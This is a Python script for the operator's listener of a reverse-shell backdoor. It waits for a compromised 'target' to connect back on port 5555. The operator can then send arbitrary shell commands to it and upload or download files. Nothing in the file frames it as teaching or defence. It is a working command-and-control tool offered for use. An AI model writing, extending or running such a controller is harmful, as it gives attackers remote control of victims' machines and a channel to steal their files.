import socket
import json
import os

def reliable_send(data):
    """Send data reliably by encoding it as JSON."""
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    """Receive data reliably by decoding JSON."""
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    """Upload a file to the client."""
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    """Download a file from the client."""
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication():
    """Main function to handle communication with the client."""
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to the specified IP and port
sock.bind(('ENTER_YOUR_IP_HERE', 5555))
print('[+] Listening For The Incoming Connections')
# Listen for incoming connections
sock.listen(5)
# Accept the connection from the client
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
# Start communication with the target
target_communication()
